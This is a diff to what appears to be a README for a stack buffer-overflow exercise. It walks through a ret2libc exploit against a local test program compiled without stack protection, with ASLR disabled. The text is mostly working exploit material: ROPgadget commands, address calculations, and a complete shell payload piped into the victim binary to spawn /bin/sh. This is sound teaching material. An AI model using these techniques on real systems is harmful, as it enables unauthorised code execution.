@@ -19,7 +19,7 @@ Tested on Ubuntu 14.04 with Linux Linux 3.19.0-25-generic.
 	$ gcc -fno-stack-protector -o victim victim.c
 2. Disable ASLR: 
 	$ echo 0 > /proc/sys/kernel/randomize_va_space 
-3. Address of buffer can be obtained via (e.g., 0x7fffffffdc00)
+3. Address of buffer can be obtained via (e.g., 7fffffffdc20)
 	$ ./victim
 4. Gadget "pop  %rdi ; retq" can be obtained via:
 	$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
@@ -30,12 +30,14 @@ Result: 0x0000000000022b1a : pop rdi ; ret
 
 7. Make the final exploit:
 
-buffer: 0x7fffffffdc00 
+buffer: 0x7fffffffdc20 
 libc base: 0x7ffff7a15000
 system: 0x7ffff7a15000 + 0x46640 = 0x7ffff7a5b640 
 gadgets: 0x7ffff7a15000 + 0x22b1a = 0x7ffff7a37b1a
-bash: 0x7fffffffdc00 + 64d + 8d + 24d = 0x7fffffffdc60 
+bash: 0x7fffffffdc20 + 64d + 8d + 24d = 0x7fffffffdc80 
 
-(((printf %0144d 0; printf %016x 0x7ffff7a37b1a | tac -rs..; printf %016x 0x7fffffffdc60 | tac -rs..; printf %016x 0x7ffff7a5b640 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
+(((printf %0144d 0; printf %016x 0x7ffff7a37b1a | tac -rs..; printf %016x 0x7fffffffdc80 | tac -rs..; printf %016x 0x7ffff7a5b640 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim
 
 After pressing Enter twice, we will have a shell.
+
+Notes: exploit.py is the python script implementing what's mentioned above. Run: $ ( ./exploit.py ; cat ) | ./victim
